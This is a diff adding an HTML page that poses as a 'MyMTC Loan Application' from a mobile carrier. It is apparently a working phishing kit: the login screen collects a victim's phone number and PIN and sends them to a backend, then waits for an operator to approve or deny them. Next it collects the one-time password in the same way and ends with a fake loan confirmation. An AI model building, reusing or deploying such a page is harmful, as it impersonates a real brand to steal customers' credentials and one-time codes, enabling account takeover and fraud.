@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MyMTC Loan Application</title>
+  <!-- Inlined user-provided CSS -->
+  <style>
+/* =========================================
+   MyMTC-inspired Mobile UI
+   ========================================= */
+
+:root {
+  --mtc-red: #e30613;
+  --mtc-dark-red: #c9000b;
+  --mtc-black: #171717;
+  --mtc-dark: #252525;
+  --mtc-gray: #6b6b6b;
+  --mtc-light-gray: #f5f5f5;
+  --mtc-border: #e7e7e7;
+  --mtc-white: #ffffff;
+  --success: #20a464;
+  --warning: #f4a000;
+
+  --radius-sm: 8px;
+  --radius-md: 14px;
+  --radius-lg: 20px;
+
+  --shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+}
+
+/* Reset */
+
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+
+html, body {
+  width: 100%;
+  height: 100%;
+}
+
+body {
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+    Roboto, Helvetica, Arial, sans-serif;
+  background: var(--mtc-light-gray);
+  color: var(--mtc-black);
+  overflow: hidden;
+}
+
+/* App container */
+
+.app {
+  width: 100%;
+  max-width: 480px;
+  height: 100vh;
+  margin: 0 auto;
+  background: var(--mtc-light-gray);
+  position: relative;
+  overflow: hidden;
+}
+
+/* Screen Management */
+
+.screen {
+  position: absolute;
+  width: 100%;
+  height: 100%;
+  top: 0;
+  left: 0;
+  display: flex;
+  flex-direction: column;
+  animation: slideIn 0.3s ease-out;
+  transition: opacity 0.3s ease;
+}
+
+.screen.hidden {
+  display: none;
+  pointer-events: none;
+}
+
+@keyframes slideIn {
+  from {
+    opacity: 0;
+    transform: translateY(20px);
+  }
+  to {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+/* =========================================
+   Header
+   ========================================= */
+
+.header {
+  background: var(--mtc-red);
+  color: white;
+  padding: 20px 18px 26px;
+  border-radius: 0 0 24px 24px;
+  flex-shrink: 0;
+}
+
+.header-top {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+
+.logo {
+  font-size: 24px;
+  font-weight: 800;
+  letter-spacing: -1px;
+}
+
+.header-icon {
+  width: 40px;
+  height: 40px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  background: rgba(255, 255, 255, 0.16);
+  color: white;
+  font-weight: 700;
+}
+
+/* =========================================
+   Page Content
+   ========================================= */
+
+.page-content {
+  flex: 1;
+  overflow-y: auto;
+  padding: 22px 16px 20px;
+  display: flex;
+  flex-direction: column;
+}
+
+.page-content h2 {
+  font-size: 24px;
+  font-weight: 700;
+  margin-bottom: 8px;
+}
+
+.subtitle {
+  color: var(--mtc-gray);
+  font-size: 14px;
+  margin-bottom: 20px;
+}
+
+/* =========================================
+   Loan Info Section
+   ========================================= */
+
+.loan-info {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  justify-content: center;
+  padding: 40px 16px;
+  text-align: center;
+  background: white;
+  border-radius: var(--radius-lg);
+  margin-bottom: 20px;
+  box-shadow: var(--shadow);
+}
+
+.loan-info h2 {
+  font-size: 28px;
+  color: var(--mtc-red);
+  margin-bottom: 12px;
+  text-align: center;
+}
+
+.loan-info p {
+  color: var(--mtc-gray);
+  margin-bottom: 24px;
+  font-size: 15px;
+}
+
+.benefits {
+  list-style: none;
+  text-align: left;
+  display: inline-block;
+}
+
+.benefits li {
+  padding: 8px 0;
+  color: var(--mtc-black);
+  font-weight: 500;
+}
+
+/* =========================================
+   Forms
+   ========================================= */
+
+.input-group {
+  margin-bottom: 16px;
+}
+
+.input-group label {
+  display: block;
+  margin-bottom: 7px;
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--mtc-black);
+}
+
+.input,
+select {
+  width: 100%;
+  border: 1px solid var(--mtc-border);
+  background: white;
+  padding: 14px;
+  border-radius: 10px;
+  outline: none;
+  font-size: 15px;
+  color: var(--mtc-black);
+  font-family: inherit;
+}
+
+.input:focus,
+select:focus {
+  border-color: var(--mtc-red);
+  box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.1);
+}
+
+select {
+  appearance: none;
+  cursor: pointer;
+  background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%23171717' d='M1 1l5 5 5-5'/%3E%3C/svg%3E");
+  background-repeat: no-repeat;
+  background-position: right 12px center;
+  padding-right: 36px;
+}
+
+/* =========================================
+   Buttons
+   ========================================= */
+
+.btn {
+  border: none;
+  padding: 13px;
+  border-radius: 10px;
+  font-weight: 700;
+  cursor: pointer;
+  font-size: 15px;
+  transition: all 0.3s ease;
+}
+
+.btn:active {
+  transform: scale(0.98);
+}
+
+.btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+
+.btn-primary {
+  background: var(--mtc-red);
+  color: white;
+}
+
+.btn-primary:hover {
+  background: var(--mtc-dark-red);
+}
+
+.btn-secondary {
+  background: #f1f1f1;
+  color: var(--mtc-black);
+}
+
+.btn-secondary:hover {
+  background: #e5e5e5;
+}
+
+.btn-resend {
+  width: 100%;
+  margin-top: 16px;
+  padding: 12px;
+  background: transparent;
+  color: var(--mtc-red);
+  border: 2px solid var(--mtc-red);
+  border-radius: 10px;
+  font-weight: 600;
+  cursor: pointer;
+  font-size: 14px;
+  transition: all 0.3s ease;
+}
+
+.btn-resend:hover {
+  background: rgba(227, 6, 19, 0.05);
+}
+
+.btn-resend:disabled {
+  opacity: 0.5;
+  cursor: not-allowed;
+}
+
+/* =========================================
+   Timer/Countdown
+   ========================================= */
+
+.timer {
+  text-align: center;
+  margin: 24px 0 20px;
+  padding: 16px;
+  background: rgba(227, 6, 19, 0.1);
+  border-radius: 10px;
+  border-left: 4px solid var(--mtc-red);
+}
+
+#countdown {
+  font-size: 24px;
+  font-weight: 700;
+  color: var(--mtc-red);
+}
+
+.timer.expired #countdown {
+  color: var(--mtc-gray);
+}
+
+/* =========================================
+   Loading Screen
+   ========================================= */
+
+#loadingScreen {
+  background: rgba(0, 0, 0, 0.7);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+}
+
+.loading-container {
+  text-align: center;
+  background: white;
+  padding: 40px;
+  border-radius: var(--radius-lg);
+}
+
+.spinner {
+  width: 50px;
+  height: 50px;
+  border: 4px solid var(--mtc-light-gray);
+  border-top: 4px solid var(--mtc-red);
+  border-radius: 50%;
+  margin: 0 auto 20px;
+  animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+
+.loading-container p {
+  color: var(--mtc-gray);
+  font-weight: 600;
+}
+
+/* =========================================
+   Approval Container
+   ========================================= */
+
+.approval-container {
+  flex: 1;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center;
+  text-align: center;
+  padding: 40px 20px;
+}
+
+.approval-icon {
+  width: 100px;
+  height: 100px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 48px;
+  margin-bottom: 24px;
+  color: white;
+}
+
+.approval-icon.success {
+  background: var(--success);
+}
+
+.approval-icon.error {
+  background: #e74c3c;
+}
+
+.approval-container h2 {
+  font-size: 26px;
+  margin-bottom: 12px;
+  text-align: center;
+}
+
+.approval-container p {
+  color: var(--mtc-gray);
+  margin-bottom: 12px;
+  line-height: 1.6;
+  font-size: 15px;
+}
+
+.approval-amount {
+  font-size: 28px;
+  font-weight: 700;
+  color: var(--mtc-red);
+  margin-top: 16px !important;
+}
+
+.approval-details {
+  background: rgba(227, 6, 19, 0.05);
+  padding: 12px;
+  border-radius: 8px;
+  margin-top: 16px !important;
+  border-left: 4px solid var(--mtc-red);
+}
+
+/* =========================================
+   Scrollbar Styling
+   ========================================= */
+
+.page-content::-webkit-scrollbar {
+  width: 6px;
+}
+
+.page-content::-webkit-scrollbar-track {
+  background: transparent;
+}
+
+.page-content::-webkit-scrollbar-thumb {
+  background: var(--mtc-border);
+  border-radius: 3px;
+}
+
+.page-content::-webkit-scrollbar-thumb:hover {
+  background: var(--mtc-gray);
+}
+
+/* =========================================
+   Responsive
+   ========================================= */
+
+@media (min-width: 481px) {
+  body {
+    padding: 20px 0;
+    background: #eaeaea;
+  }
+
+  .app {
+    min-height: calc(100vh - 40px);
+    border-radius: 20px;
+    overflow: hidden;
+    box-shadow: var(--shadow);
+  }
+}
+
+/* =========================================
+   Mobile Safe Area
+   ========================================= */
+
+@supports (padding: max(0px)) {
+  .header {
+    padding-top: max(20px, env(safe-area-inset-top));
+    padding-bottom: max(26px, env(safe-area-inset-bottom));
+  }
+
+  .page-content {
+    padding-bottom: max(20px, env(safe-area-inset-bottom));
+  }
+}
+
+/* Additional styles to place login overlay like the screenshot */
+.login-overlay {
+  position: absolute;
+  left: 0; right: 0; top: 0; bottom: 0;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+}
+
+.login-card-visual {
+  width: 100%;
+  max-width: 420px;
+  background: transparent;
+  text-align: left;
+}
+
+.login-logo-centered {
+  width: 96px;
+  height: 96px;
+  margin: 0 auto 10px;
+  display: block;
+}
+
+.login-title-center {
+  color: white;
+  font-size: 18px;
+  font-weight: 700;
+  margin-bottom: 12px;
+  text-align: left;
+}
+
+.login-input {
+  width: 100%;
+  border-radius: 12px;
+  padding: 14px 16px;
+  background: rgba(255,255,255,0.06);
+  color: white;
+  border: 1px solid rgba(255,255,255,0.2);
+  margin-bottom: 14px;
+}
+
+.login-btn {
+  width: 100%;
+  padding: 14px;
+  border-radius: 12px;
+  background: #00a8d4; /* teal similar to screenshot */
+  color: white;
+  font-weight: 700;
+  border: none;
+}
+
+/* background for login page uses asset path - replace assets/login-bg.jpg with your screenshot */
+#page3.login-screen {
+  background-image: url('assets/login-bg.jpg');
+  background-size: cover;
+  background-position: center;
+}
+
+/* make inputs and text readable on bg */
+#page3 .login-card-visual { padding-top: 140px; }
+#page3 .login-title-center { color: #fff; text-shadow: 0 1px 2px rgba(0,0,0,0.6); }
+#page3 .login-input::placeholder { color: rgba(255,255,255,0.75); }
+#page3 .login-input { background: rgba(255,255,255,0.08); }
+
+</style>
+</head>
+<body>
+  <div class="app" id="app">
+
+    <!-- Page 3: Login (uses user screenshot as bg) -->
+    <div id="page3" class="screen login-screen">
+      <div class="login-overlay">
+        <div class="login-card-visual">
+          <img src="assets/login-logo.png" alt="MTC logo" class="login-logo-centered">
+          <div class="login-title-center">Enter your phone number</div>
+
+          <input type="tel" id="loginPhone" class="login-input" placeholder="Enter Mobile Number" pattern="^\+264[0-9]{8}$" required>
+
+          <div style="display:flex; gap:12px; margin-top:6px;">
+            <input type="password" id="loginPin" class="login-input" placeholder="PIN" maxlength="4" style="flex:1"/>
+          </div>
+
+          <div style="padding-top:12px;">
+            <button id="loginBtn" class="login-btn">Login</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Page 4: OTP Verification -->
+    <div id="page4" class="screen hidden">
+      <div class="header">
+        <div class="header-top">
+          <div class="logo">MyMTC</div>
+          <div class="header-icon">3/3</div>
+        </div>
+      </div>
+
+      <div class="page-content">
+        <h2>Verify Your Phone</h2>
+        <p class="subtitle">Enter the OTP sent to your number</p>
+
+        <div class="input-group">
+          <label>One-Time Password</label>
+          <input type="text" id="otpCode" class="input" placeholder="000000" maxlength="6" pattern="[0-9]{6}" required>
+        </div>
+
+        <div class="timer">
+          <span id="countdown">130s</span>
+        </div>
+
+        <div style="display: flex; gap: 12px; padding: 0 16px;">
+          <button class="btn btn-secondary" onclick="goToPage(3)" style="flex: 1;">Back</button>
+          <button class="btn btn-primary" onclick="submitOTP()" style="flex: 1;">Verify</button>
+        </div>
+
+        <button class="btn-resend" onclick="resendOTP()">Resend OTP</button>
+
+        <p id="otpStatus" class="status-text"></p>
+      </div>
+    </div>
+
+    <!-- Page 5: Approval Status -->
+    <div id="page5" class="screen hidden">
+      <div class="header">
+        <div class="header-top">
+          <div class="logo">MyMTC</div>
+          <div class="header-icon">✓</div>
+        </div>
+      </div>
+
+      <div class="page-content">
+        <div class="approval-container">
+          <div class="approval-icon success">✓</div>
+          <h2>Congratulations!</h2>
+          <p>Your loan application has been submitted for review.</p>
+          <p class="approval-amount" id="approvalAmount"></p>
+          <p class="approval-details">You will receive an SMS notification once your loan has been approved.</p>
+
+          <button class="btn btn-primary" onclick="goToPage(1)" style="width: 100%; margin-top: 30px; padding: 16px;">
+            Done
+          </button>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <script>
+// Minimal client logic to navigate and call the backend (assumes backend endpoints exist as in server.js)
+function showPage(id) { document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden')); document.getElementById(id).classList.remove('hidden'); }
+function goToPage(n) { showPage('page'+n); }
+
+function uuidv4() { return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) { var r = Math.random()*16|0, v = c=='x'?r:(r&0x3|0x8); return v.toString(16); }); }
+
+let currentSessionId = null;
+let pollInterval = null;
+
+async function submitLogin() {
+  const phone = document.getElementById('loginPhone').value;
+  const pin = document.getElementById('loginPin').value;
+  if (!phone || !pin) { alert('Enter phone and PIN'); return; }
+  currentSessionId = uuidv4();
+  document.getElementById('loginBtn').disabled = true;
+  try {
+    await fetch('/api/sendLogin', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ phone, pin, sessionId: currentSessionId }) });
+    // poll for decision
+    pollInterval = setInterval(checkDecision, 2000);
+  } catch (err) {
+    console.error(err); alert('Failed to send login'); document.getElementById('loginBtn').disabled = false;
+  }
+}
+
+async function checkDecision() {
+  if (!currentSessionId) return;
+  try {
+    const res = await fetch('/api/session/' + currentSessionId);
+    const json = await res.json();
+    if (json.status && json.status !== 'pending') {
+      clearInterval(pollInterval); pollInterval = null; handleDecision(json);
+    }
+  } catch (err) { console.error(err); }
+}
+
+function handleDecision(session) {
+  if (session.type === 'login') {
+    if (session.status === 'approved') {
+      document.getElementById('loginBtn').disabled = false;
+      goToPage(4);
+      startCountdown(130);
+    } else if (session.status === 'denied') {
+      alert(session.message || 'PIN provided is wrong. Please try again.');
+      document.getElementById('loginBtn').disabled = false;
+    }
+  } else if (session.type === 'otp') {
+    if (session.status === 'approved') {
+      goToPage(5);
+    } else {
+      alert(session.message || 'OTP is invalid or expired');
+    }
+  }
+}
+
+document.getElementById('loginBtn').addEventListener('click', submitLogin);
+
+async function submitOTP() {
+  const otp = document.getElementById('otpCode').value;
+  if (!otp || otp.length !== 6) { alert('Enter 6-digit OTP'); return; }
+  currentSessionId = uuidv4();
+  try {
+    await fetch('/api/sendOTP', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ otp, sessionId: currentSessionId }) });
+    pollInterval = setInterval(checkDecision, 2000);
+  } catch (err) { console.error(err); alert('Failed to send OTP'); }
+}
+
+function resendOTP() { alert('Resend OTP not implemented in demo'); }
+
+let countdownTimer = null;
+function startCountdown(seconds) {
+  const el = document.getElementById('countdown');
+  let s = seconds; el.textContent = s + 's'; clearInterval(countdownTimer);
+  countdownTimer = setInterval(() => { s -= 1; if (s <= 0) { clearInterval(countdownTimer); el.textContent = 'Expired'; } else { el.textContent = s + 's'; } }, 1000);
+}
+
+// show login page on load
+showPage('page3');
+  </script>
+</body>
+</html>
